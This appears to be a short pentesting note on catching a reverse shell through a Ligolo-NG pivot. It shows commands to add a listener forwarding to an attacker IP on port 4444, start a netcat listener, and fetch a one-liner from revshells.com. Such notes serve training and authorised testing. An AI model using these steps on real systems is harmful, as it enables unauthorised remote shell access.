## Required Components

- Setup Ligo-NG proxy and agent first from here

---

```bash
https://github.com/Boon-Rekcah/Pivoting-Tunneling-Port-Forwarding-/blob/main/Ligolo-NG/Single-Pivot/Single-Pivot.md
```

---

1. On Your Ligolo-NG proxy terminal select correct agent session

```bash
session
```

2. Add a Listener

```bash
listener_add --addr 0.0.0.0:9696 --to <Atacker IP>:4444
```

3. On Attacker Machine start reverse shell listener on new terminal

```bash
nc -nvlp 4444
```

4. Use Following link to generate a basic reverse shell One-Liner

```bash
https://www.revshells.com/
```
